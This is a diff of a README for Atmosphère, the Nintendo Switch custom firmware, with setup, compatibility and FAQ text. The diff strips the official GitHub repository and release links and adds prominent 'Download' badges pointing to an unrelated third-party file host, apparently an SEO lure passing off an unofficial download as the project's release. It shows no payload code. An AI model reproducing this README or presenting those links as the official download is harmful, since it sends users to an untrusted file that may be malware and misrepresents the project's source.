@@ -1,159 +1,373 @@
-<div align="center">
 
-# Atmosphère
+# Atmosphère — Nintendo Switch Custom Firmware
 
-### Custom Firmware for Nintendo Switch
+<p align="center">
+  <img src="https://img.shields.io/badge/Platform-Nintendo%20Switch-blue?style=for-the-badge" alt="Nintendo Switch"/>
+  <img src="https://img.shields.io/badge/Type-Custom%20Firmware-green?style=for-the-badge" alt="Custom Firmware"/>
+  <img src="https://img.shields.io/badge/Atmosph%C3%A8re-1.12.2-orange?style=for-the-badge" alt="Atmosphere 1.12.2"/>
+  <img src="https://img.shields.io/badge/License-GPL--2.0-lightgrey?style=for-the-badge" alt="GPL 2.0"/>
+</p>
 
-An open-source custom firmware project for the Nintendo Switch, built around modular system components and homebrew support.
+<p align="center">
+  A custom firmware environment for compatible Nintendo Switch consoles, supporting homebrew applications, system extensions, and advanced system customization.
+</p>
 
-[Official GitHub Repository](https://github.com/Atmosphere-NX/Atmosphere) · [Releases](https://github.com/Atmosphere-NX/Atmosphere/releases) · [NH Switch Guide](https://switch.hacks.guide/)
+<p align="center">
+  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Nintendo%20Switch%20CFW-blue?style=for-the-badge&logo=github" alt="Download Nintendo Switch CFW"/></a>
+</p>
 
-</div>
+## Overview
 
-## Product Overview
+Atmosphère is an open-source custom firmware (CFW) for the Nintendo Switch. It provides an alternative system environment with support for homebrew applications, custom system modules, patches, debugging tools, and additional functionality.
 
-Atmosphère is an open-source custom firmware (CFW) for Nintendo Switch. It modifies and extends the Horizon operating system through a collection of components that replace or modify different parts of the console's software environment.
+Atmosphère is commonly used together with the Hekate bootloader. Depending on the console hardware, installation may require an RCM-based exploit or a compatible hardware modification.
 
-The project provides infrastructure for homebrew applications, custom system modules, filesystem modifications, and emulated NAND configurations.
+A typical setup can include:
 
-The latest official release identified is **Atmosphère 1.12.2**, released November 11, 2026. It adds basic support for Nintendo Switch firmware 23.5.0.
+- **Atmosphère:** The custom firmware environment.
+- **Hekate:** A bootloader and configuration interface.
+- **Homebrew Menu:** An application launcher for compatible homebrew software.
+- **EmuMMC:** An emulated NAND environment stored on the microSD card.
+- **System modules:** Optional extensions that add functionality to the system.
 
-## Technical Architecture
-
-Atmosphère uses a modular architecture consisting of several major components:
-
-- **Fusée:** First-stage loader responsible for loading and validating the second-stage custom TrustZone and system package.
-- **Exosphère:** Customized TrustZone implementation providing a modified secure monitor.
-- **Thermosphère:** Provides EL2-based emuNAND support, allowing NAND images to be redirected and virtualized.
-- **Stratosphère:** Collection of custom system modules that extend kernel functionality and modify important system services.
-- **Troposphère:** Application-level Horizon OS patches that implement additional CFW features.
+Atmosphère does not make every Nintendo Switch model compatible with the same installation method. Hardware revision and system firmware must be considered before choosing a setup.
 
 ## Key Features
 
-- Custom firmware environment for Nintendo Switch.
-- Homebrew application support.
-- Custom system module support.
-- EmuMMC and NAND redirection through Thermosphère.
-- System-level patches and service modifications.
-- Layered filesystem support for compatible game modifications.
-- Integrated Homebrew Launcher components.
-- Custom kernel and secure-monitor implementations.
-- Cheat engine functionality through the included `dmnt` component.
-- Compatibility updates for newer Horizon OS firmware releases.
-
-## Module Overview
-
-| Component | Primary Function |
-|---|---|
-| Fusée | First-stage bootloader |
-| Exosphère | Customized secure monitor |
-| Thermosphère | EmuNAND and virtualized NAND support |
-| Stratosphère | Custom system modules |
-| Troposphère | Application-level system patches |
-| `dmnt` | Cheat engine functionality |
-| Homebrew Launcher | Homebrew application launching |
-| hbmenu | Homebrew Menu interface |
-
-## Supported Platforms
-
-- Nintendo Switch family running compatible Horizon OS firmware.
-- Compatible original Switch hardware configurations.
-- Compatible modchip-based Switch configurations.
-
-Atmosphère is designed for Nintendo Switch. It is not a Nintendo Switch 2 custom firmware.
-
-## Compatibility Information
-
-The latest identified Atmosphère release is **1.12.2**.
-
-| Item | Compatibility |
-|---|---|
-| Atmosphère version | 1.12.2 |
-| Latest documented firmware support | 23.5.0 |
-| Homebrew Launcher | 2.4.5 |
-| Homebrew Menu | 3.6.1 |
-| Boot payload | `fusee.bin` |
-| Bootloader integration | hekate |
-| EmuMMC | Supported |
-| Custom system modules | Supported |
-
-Firmware compatibility does not guarantee that every third-party sysmodule, overlay, theme, or homebrew application will work. Check the compatibility requirements of each additional component before updating.
+- **Homebrew Support:** Run compatible homebrew applications through the Homebrew Menu.
+- **Custom System Environment:** Provides modified system components and additional functionality.
+- **EmuMMC Support:** Run a separate emulated system NAND from microSD storage.
+- **Hekate Integration:** Boot Atmosphère using supported Hekate configurations.
+- **System Modules:** Load compatible extensions and background services.
+- **Custom Themes:** Use supported theme tools to personalize the system interface.
+- **Game Mod Support:** Load compatible game modifications and LayeredFS content.
+- **Cheat Support:** Use compatible cheat systems and homebrew utilities.
+- **Debugging Tools:** Access supported development and diagnostic functionality.
+- **Homebrew Applications:** Use file managers, save managers, media tools, and other compatible applications.
+- **Configuration Options:** Customize boot behavior and supported system settings.
+- **Open-Source Development:** Maintained as a community-driven open-source project.
 
 ## Technical Specifications
 
-| Specification | Details |
+| Component | Details |
 |---|---|
-| Project | Atmosphère |
-| Developer | Atmosphere-NX contributors |
-| Latest identified version | 1.12.2 |
+| CFW | Atmosphère |
+| Latest referenced release | 1.12.2 |
+| Release date | November 11, 2026 |
+| Bootloader | Hekate 6.5.5 |
+| Latest referenced firmware support | Horizon OS 23.5.0 |
 | Platform | Nintendo Switch |
-| Operating system environment | Horizon OS |
-| Architecture | ARM64 |
-| Project type | Custom firmware |
-| License | GPL-2.0, with documented exceptions |
-| Main language | C and C++ |
+| System architecture | ARM64 |
+| Homebrew launcher | Homebrew Menu |
 | Boot payload | `fusee.bin` |
-| Homebrew support | Yes |
-| EmuMMC support | Yes |
+| Configuration directory | `/atmosphere/config/` |
+| Bootloader directory | `/bootloader/` |
+| Emulated NAND | EmuMMC |
+| Storage | microSD |
+| Filesystem | FAT32 or exFAT, depending on configuration |
+| License | GPL-2.0 |
 
-## Installation Guide
+Version compatibility changes over time. Always verify the Atmosphère and Hekate release notes before updating the console.
 
-1. Check the console's hardware compatibility and current firmware version.
-2. Read the current NH Switch Guide instructions for the appropriate hardware configuration.
-3. Prepare a compatible microSD card using the guide's recommended format and partition layout.
-4. Download the official Atmosphère release package.
-5. Extract the package contents to the root of the microSD card.
-6. Obtain the matching `fusee.bin` payload from the official release.
-7. Prepare the compatible bootloader configuration, such as hekate, if required by the selected setup.
-8. Follow the appropriate boot procedure for the console's hardware.
-9. Launch Atmosphère and verify the installed version in the system environment.
+## Compatibility
 
-For existing installations, follow the official update guide and check all component compatibility before updating system firmware.
+Atmosphère supports compatible Nintendo Switch hardware, but installation methods differ between hardware revisions.
+
+| Console model | Compatibility considerations |
+|---|---|
+| Nintendo Switch V1 (unpatched Erista) | RCM-based exploit can be used on compatible units |
+| Nintendo Switch V1 (patched Erista) | RCM exploit is blocked; hardware modification may be required |
+| Nintendo Switch V2 (Mariko) | Compatible hardware modification required |
+| Nintendo Switch Lite | Compatible hardware modification required |
+| Nintendo Switch OLED | Compatible hardware modification required |
+
+### Hardware Compatibility Notes
+
+- Not every V1 console is unpatched.
+- Serial number ranges can help identify potentially vulnerable units, but are not a guarantee.
+- Patched Erista and Mariko-based consoles cannot use the original unpatched RCM exploit.
+- Lite and OLED models require hardware-specific installation methods.
+- Hardware modifications should be performed by qualified technicians.
+- Firmware compatibility must be checked against the exact Atmosphère and Hekate versions.
+
+### Firmware Compatibility
+
+The latest referenced Atmosphère release, 1.12.2, supports Horizon OS 23.5.0.
+
+Older Atmosphère releases may not support newer system firmware. Avoid updating the official system software before checking compatibility with the required CFW components.
+
+## Firmware Features
+
+### Atmosphère CFW
+
+Atmosphère provides the core custom firmware environment.
+
+Its components include:
+
+- `exosphere` — custom secure monitor implementation.
+- `mesosphere` — custom kernel implementation.
+- `stratosphere` — system module and service components.
+- `loader` — application and system loading functionality.
+- `fatal` — crash and error handling.
+- Homebrew-related system integration.
+
+### Hekate Bootloader
+
+Hekate provides a boot menu and configuration environment.
+
+Common capabilities include:
+
+- Launching Atmosphère.
+- Selecting boot configurations.
+- Managing EmuMMC.
+- Creating NAND backups.
+- Accessing supported USB tools.
+- Loading compatible payloads.
+- Viewing system information.
+
+### EmuMMC
+
+EmuMMC allows a separate copy of the system NAND to be stored on the microSD card.
+
+Common uses include:
+
+- Keeping a separate CFW environment.
+- Separating selected system modifications from the physical NAND.
+- Testing compatible homebrew configurations.
+- Maintaining a separate system environment for development.
+
+EmuMMC is not a complete guarantee against bans or other account and network consequences.
+
+### Homebrew Environment
+
+The Homebrew Menu provides access to compatible applications.
+
+Common homebrew formats include:
+
+- `.nro` — Nintendo Switch homebrew application.
+- `.nsp` — Nintendo Switch package format.
+- `.kip` — system module format.
+- `.ovl` — overlay application format.
+
+The Homebrew Menu is commonly accessed through the Album or an application takeover method, depending on the configuration.
+
+## System Requirements
+
+### Console Requirements
+
+- Compatible Nintendo Switch console.
+- Hardware-compatible CFW installation method.
+- Supported Atmosphère and Hekate versions.
+- Reliable microSD card.
+- Sufficient free storage.
+- Compatible system firmware.
+- Access to the required boot payload or hardware boot configuration.
+
+### Computer Requirements
+
+A computer is useful for:
+
+- Preparing and formatting the microSD card.
+- Extracting Atmosphère and Hekate archives.
+- Managing boot configuration files.
+- Creating and storing NAND backups.
+- Copying homebrew applications.
+- Maintaining configuration backups.
+
+### Storage Requirements
+
+Recommended preparation:
+
+- Use a reliable microSD card.
+- FAT32 is generally preferred for homebrew setups.
+- Keep sufficient free space for EmuMMC and backups.
+- Maintain a separate copy of important files.
+- Avoid removing the card while the console is writing data.
+
+## Download & Installation
+
+<p align="center">
+  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-Latest%20Package-blue?style=for-the-badge&logo=github" alt="Download Latest Package"/></a>
+</p>
+
+### Before Installation
+
+1. Identify the exact Switch hardware revision.
+2. Check whether the console supports the intended installation method.
+3. Verify Atmosphère compatibility with the installed system firmware.
+4. Prepare a reliable microSD card.
+5. Back up important data.
+6. Follow hardware-specific installation documentation.
+
+### Software Preparation
+
+A typical Atmosphère microSD setup contains:
+
+- `atmosphere/`
+- `bootloader/`
+- `switch/`
+- `hbmenu.nro`
+- `payload.bin` or other boot files, depending on the boot method.
+
+The exact file layout depends on the selected bootloader and installation configuration.
+
+### Booting Atmosphère
+
+1. Prepare the microSD card with compatible Atmosphère files.
+2. Install or configure Hekate for the console's hardware.
+3. Use the appropriate boot method for the console.
+4. Select the intended boot entry.
+5. Start Atmosphère.
+6. Verify that the CFW environment starts successfully.
+
+Unpatched V1 consoles commonly use an RCM payload workflow. Hardware-modified consoles use their supported boot configuration.
+
+### EmuMMC Setup
+
+EmuMMC can be configured through Hekate on supported setups.
+
+Before creating or migrating an EmuMMC:
+
+- Ensure sufficient microSD storage.
+- Create a verified NAND backup.
+- Confirm the selected partition or file-based configuration.
+- Keep the original NAND backup in a separate safe location.
+
+Do not use a firmware package or boot configuration intended for a different hardware revision.
+
+## Configuration & Management
+
+### Atmosphère Configuration
+
+Atmosphère supports configuration files and optional system modules.
+
+Common configuration locations include:
+
+- `/atmosphere/config/`
+- `/atmosphere/contents/`
+- `/bootloader/hekate_ipl.ini`
+- `/switch/`
+
+The exact files and directory structure depend on the installed release and optional components.
+
+### Hekate Boot Entries
+
+Hekate boot entries can be configured to provide different boot options, such as:
+
+- Stock system boot.
+- Atmosphère with EmuMMC.
+- Atmosphère with SysNAND.
+- Additional supported configurations.
+
+Review each entry before selecting it. Boot configurations can affect which NAND environment is started.
+
+### Homebrew Management
+
+Homebrew applications are commonly stored in:
+
+`/switch/`
+
+Applications can be launched through the Homebrew Menu when they are compatible with the installed firmware and homebrew environment.
+
+### System Modules and Overlays
+
+Optional extensions may add:
+
+- Performance monitoring.
+- System information overlays.
+- Controller and input utilities.
+- Theme management.
+- Additional homebrew functionality.
+
+Only install modules that are compatible with the installed Atmosphère release and system firmware.
+
+### Updating Atmosphère
+
+Before updating:
+
+1. Check the current firmware compatibility information.
+2. Read the release notes for Atmosphère and Hekate.
+3. Back up the microSD card.
+4. Update the required files using the official instructions.
+5. Update the boot payload when required.
+6. Verify that the selected boot configuration still works.
+
+Avoid mixing files from different CFW packages or outdated bootloader releases.
+
+## Troubleshooting
+
+| Problem | Recommended action |
+|---|---|
+| Atmosphère does not boot | Verify hardware compatibility, boot payload, and file layout. |
+| Black screen during startup | Check Hekate configuration and Atmosphère compatibility. |
+| `Fatal error` during boot | Review the error report and check for incompatible system modules. |
+| Homebrew Menu does not open | Verify `hbmenu.nro` and the selected launch method. |
+| EmuMMC is not detected | Check Hekate EmuMMC configuration and microSD partition layout. |
+| System update causes boot failure | Verify that Atmosphère and Hekate support the installed firmware. |
+| Homebrew application crashes | Check application compatibility and required dependencies. |
+| Overlay does not load | Verify overlay loader and module versions. |
+| microSD card is not detected | Check card condition, filesystem, and console compatibility. |
+| Boot configuration is missing | Verify `hekate_ipl.ini` and the `/bootloader/` directory. |
+
+### Recovery Recommendations
+
+- Keep a verified NAND backup.
+- Preserve the original boot configuration.
+- Use a known-compatible Atmosphère release when diagnosing problems.
+- Remove recently installed optional modules if they cause startup failures.
+- Do not delete system files to resolve an unexplained boot error.
+- Follow recovery documentation for the exact hardware revision.
 
 ## FAQ
 
-### What is Atmosphère?
+### 1. What is Atmosphère?
 
-Atmosphère is an open-source custom firmware for Nintendo Switch that modifies and extends the Horizon OS environment.
+Atmosphère is an open-source custom firmware for compatible Nintendo Switch consoles. It provides homebrew support, system modifications, and additional system functionality.
 
-### Does Atmosphère support homebrew?
+### 2. Is Atmosphère the same as Hekate?
 
-Yes. It includes Homebrew Launcher components and supports compatible homebrew applications.
+No. Atmosphère is the custom firmware environment. Hekate is a bootloader that can launch Atmosphère and provide additional boot and maintenance tools.
 
-### What is emuMMC?
+### 3. Does Atmosphère work on every Nintendo Switch?
 
-emuMMC is an emulated NAND environment. Atmosphère provides its underlying support through Thermosphère.
+No. Compatibility depends on hardware revision, installation method, and system firmware.
 
-### Is hekate required?
+### 4. Can I install Atmosphère on a Switch Lite?
 
-Atmosphère and hekate are separate projects. The boot method depends on the console's hardware and configuration.
+Switch Lite requires a compatible hardware modification. The original unpatched V1 RCM method does not apply.
 
-### What is `fusee.bin`?
+### 5. What is EmuMMC?
 
-It is Atmosphère's boot payload. The older `fusee-primary` payload is obsolete and should not be used with current releases.
+EmuMMC is an emulated NAND environment stored on the microSD card. It allows a separate system environment to be used with compatible CFW configurations.
 
-### Does Atmosphère support firmware 23.5.0?
+### 6. Do I need Hekate?
 
-Yes. Atmosphère 1.12.2 added basic support for firmware 23.5.0.
+Hekate is commonly used with Atmosphère, but alternative supported boot methods exist. The appropriate setup depends on the console and installation method.
 
-### Does Atmosphère work on Nintendo Switch 2?
+### 7. What is the Homebrew Menu?
 
-No. Atmosphère is a Nintendo Switch project and should not be treated as Switch 2 firmware.
+The Homebrew Menu is an application launcher that provides access to compatible Nintendo Switch homebrew software.
 
-### Where can I download Atmosphère?
+### 8. Can I use custom themes?
 
-Use the official Atmosphere-NX GitHub repository and its releases page.
+Yes. Compatible theme tools can modify supported interface elements. Theme compatibility should be checked after system updates.
+
+### 9. Can I update the official system firmware?
+
+Updates should only be performed after verifying that the installed Atmosphère and bootloader versions support the target firmware.
+
+### 10. Does EmuMMC guarantee protection from online bans?
+
+No. EmuMMC is a separate system environment, not a guarantee against bans or other online-service consequences.
+
+### 11. What is the latest referenced Atmosphère version?
+
+The latest referenced release is Atmosphère 1.12.2, released on November 11, 2026. It supports Horizon OS 23.5.0 according to the current compatibility guide.
+
+### 12. Is Atmosphère open source?
+
+Yes. Atmosphère is an open-source project distributed under the GPL-2.0 license.
 
 ## SEO Keywords
 
-Atmosphère, Atmosphere CFW, Nintendo Switch custom firmware, Switch homebrew, Switch CFW, Atmosphère 1.12.2, Nintendo Switch homebrew launcher, emuMMC, Thermosphère, Exosphère, Fusée, Stratosphère, Horizon OS, hekate integration, Switch firmware 23.5.0
-
-<div align="center">
-
----
-
-**Atmosphère** · Nintendo Switch Custom Firmware
-
-[Official GitHub Repository](https://github.com/Atmosphere-NX/Atmosphere)
-
-</div>
+Nintendo Switch, Nintendo Switch CFW, Atmosphère, Atmosphere CFW, Nintendo Switch Custom Firmware, Switch Homebrew, Switch Homebrew Menu, Hekate, Hekate Bootloader, EmuMMC, EmuNAND, Nintendo Switch Modding, Switch CFW Setup, Switch Firmware Compatibility, Switch Homebrew Applications, Switch System Modules, Switch Custom Themes, Switch Overlay, Switch NRO, Switch KIP, Switch Payload, Fusee Payload, Nintendo Switch V1, Nintendo Switch V2, Switch Lite CFW, Switch OLED CFW, Erista, Mariko, Switch NAND Backup, Atmosphere Installation, Atmosphere Update, Nintendo Switch Homebrew Guide
